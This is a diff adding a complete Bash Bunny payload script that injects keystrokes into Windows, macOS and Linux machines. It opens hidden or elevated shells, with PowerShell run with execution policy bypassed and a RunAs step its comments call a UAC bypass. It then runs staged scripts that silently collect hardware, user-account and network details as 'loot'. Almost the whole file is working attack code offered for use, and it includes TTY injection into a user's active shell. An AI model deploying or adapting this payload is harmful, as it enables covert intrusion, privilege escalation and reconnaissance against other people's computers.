@@ -1,0 +1,154 @@
+#!/bin/bash
+# =============================================================================
+#  Payload   : cross-platform-enum
+#  Author    : <operator>
+#  Device    : Bash Bunny Mark I / Mark II
+#  Version   : 1.0
+#
+#  Target OS : Windows (XP SP3+, Server 2003+), macOS (10.9+),
+#              Linux (all major distros, Raspberry Pi OS, Alpine, OpenWrt),
+#              FreeBSD, ChromeOS
+#              NOTE: Android requires USB debugging enabled (ADB).
+#              NOTE: iOS requires jailbreak + SSH; not automated here.
+#
+#  Purpose   : Silently detect the target OS, perform thorough enumeration
+#              of device hardware, user accounts, and network configuration,
+#              then save results as both .txt and .json to the Bash Bunny
+#              loot directory accessible via STORAGE mode.
+#
+#  Attack surface:
+#    ATTACKMODE HID STORAGE
+#    - HID (keyboard) to open a terminal and execute staged scripts
+#    - STORAGE so enum scripts are accessible from the target as a USB drive
+#
+#  Loot location (after payload completes):
+#    Switch to STORAGE mode (Switch 3 → Arming Mode or re-plug in STORAGE)
+#    Files appear in:  BashBunny:\loot\enum_<hostname>_<timestamp>\
+#      enum_windows.txt / enum_windows.json   (Windows targets)
+#      enum_unix.txt    / enum_unix.json       (macOS / Linux targets)
+#
+#  Setup (one-time, in Arming Mode via SSH):
+#    1. Copy this payload folder to /payloads/switch1/ (or switch2/)
+#    2. Verify scripts are present:
+#         /payloads/switch1/payload.txt
+#         /payloads/switch1/enum_win.ps1
+#         /payloads/switch1/enum_unix.sh
+#    3. Run: chmod +x /payloads/switch1/enum_unix.sh
+# =============================================================================
+
+# ── Stage helper scripts onto the STORAGE partition ───────────────────────────
+# The STORAGE partition is always accessible at /root/udisk from the BB side.
+# We copy our enumeration scripts there so the target can find and execute them.
+
+LED SETUP
+
+PAYLOAD_DIR="/payloads/switch$SWITCH_POSITION"
+UDISK="/root/udisk"
+
+mkdir -p "$UDISK"
+mkdir -p "$UDISK/loot/cross_platform_enum"
+cp "$PAYLOAD_DIR/enum_win.ps1"  "$UDISK/loot/cross_platform_enum/enum_win.ps1"
+cp "$PAYLOAD_DIR/enum_unix.sh"  "$UDISK/loot/cross_platform_enum/enum_unix.sh"
+chmod +x "$UDISK/enum_unix.sh"
+
+# Activate HID keyboard + STORAGE (USB drive visible to target)
+ATTACKMODE HID STORAGE
+
+# Give the target OS time to:
+#   1. Enumerate and install USB HID + Storage drivers
+#   2. Mount the BashBunny volume
+#   3. Settle before we inject keystrokes
+WAIT 6000
+
+LED ATTACK
+
+# ── DUCKY_LANG: set keyboard layout (default: US) ─────────────────────────────
+# Change to 'gb', 'de', 'fr', etc. if needed for the target's keyboard layout.
+DUCKY_LANG us
+
+# =============================================================================
+# WINDOWS ATTACK SEQUENCE
+# Opens an elevated PowerShell (UAC bypass via Run-As shortcut) hidden window,
+# locates the BashBunny drive, and executes the staged enum_win.ps1 script.
+# The script runs silently; all output goes to the BB loot directory.
+# =============================================================================
+RUN WIN "powershell -W H -NoP -NonI -Exec Bypass -C \"\$b=((gwmi Win32_Volume|?{\\$_.Label -eq 'BashBunny'})|Select -First 1).Name;if(-not \$b){\$b=(ls function:[d-z]: -n|?{Test-Path \$_+'\\enum_win.ps1'}|Select -First 1)+'\\'};if(\$b){Start-Process powershell -W H -Verb RunAs -Args '-W H -NoP -NonI -Exec Bypass -F \\\"'+\$b+'enum_win.ps1\\\"' -EA SilentlyContinue;powershell -W H -NoP -NonI -Exec Bypass -F \\\"\$b\\enum_win.ps1\\\"}\""
+
+# Small delay — let the PS window launch before we attempt other OS injections
+Q DELAY 2000
+
+# =============================================================================
+# macOS ATTACK SEQUENCE
+# Uses Spotlight to open Terminal, then runs the staged enum_unix.sh
+# On macOS, the BashBunny mounts at /Volumes/BashBunny
+# =============================================================================
+RUN OSX "osascript -e 'tell application \"Terminal\" to do script \"bash /Volumes/BashBunny/enum_unix.sh 2>/dev/null &\"'"
+
+Q DELAY 1500
+
+# =============================================================================
+# LINUX ATTACK SEQUENCE  (GNOME/KDE/XFCE/i3/sway/headless)
+# Tries multiple terminal launch methods; the script handles its own mount
+# discovery. The '&' backgrounds it so the terminal can close immediately.
+# =============================================================================
+
+# --- Method 1: GNOME / XFCE keyboard shortcut (most common desktop Linux) ---
+Q CTRL ALT t
+Q DELAY 1500
+Q STRING bash /run/media/$USER/BashBunny/enum_unix.sh 2>/dev/null || bash /media/$USER/BashBunny/enum_unix.sh 2>/dev/null || bash /media/BashBunny/enum_unix.sh 2>/dev/null &
+Q ENTER
+Q DELAY 1000
+Q ALT F4
+
+# --- Method 2: xterm fallback (if Ctrl+Alt+T didn't open a terminal) ---
+RUN UNITY "xterm -e 'bash /run/media/$USER/BashBunny/enum_unix.sh 2>/dev/null || bash /media/$USER/BashBunny/enum_unix.sh 2>/dev/null; sleep 1' &"
+
+Q DELAY 1000
+
+# --- Method 3: Linux server / headless (no GUI — try tty-style injection) ---
+# On a headless Linux server the user is likely working in an existing shell.
+# We inject into whatever foreground TTY is active.
+# This is a best-effort attempt; it may produce visible output.
+Q STRING bash /run/media/$USER/BashBunny/enum_unix.sh 2>/dev/null || bash /media/$USER/BashBunny/enum_unix.sh 2>/dev/null &
+Q ENTER
+
+# =============================================================================
+# Wait for enumeration scripts to finish running on the target.
+# Longer targets (many installed packages, large NFS exports, etc.) may need
+# more time. Increase WAIT values if loot files are incomplete.
+# =============================================================================
+LED CYAN 500
+
+# Poll loot directory for completion markers (max ~90 seconds)
+TIMEOUT=90
+ELAPSED=0
+FOUND=0
+while [ $ELAPSED -lt $TIMEOUT ]; do
+    if ls "$UDISK/loot/"*"/.done" 2>/dev/null | grep -q '.'; then
+        FOUND=1
+        break
+    fi
+    sleep 3
+    ELAPSED=$((ELAPSED + 3))
+done
+
+# ── Finalise ──────────────────────────────────────────────────────────────────
+if [ $FOUND -eq 1 ]; then
+    # Copy completed loot from udisk to BB's persistent /loot/ tree
+    mkdir -p "$LOOT_DIR"
+    cp -r "$UDISK/loot/"* "$LOOT_DIR/" 2>/dev/null
+
+    LED FINISH
+    sleep 2
+    LED OFF
+else
+    # Scripts may still be running; loot will remain on udisk (accessible via STORAGE)
+    LED YELLOW SLOW
+    sleep 5
+    LED OFF
+fi
+
+# Done.
+# To retrieve loot:
+#   Option A (STORAGE): Re-plug BB and check BashBunny:\loot\  from the host.
+#   Option B (SSH/Arming): SSH to 172.16.64.1 and browse /loot/ or /root/udisk/loot/
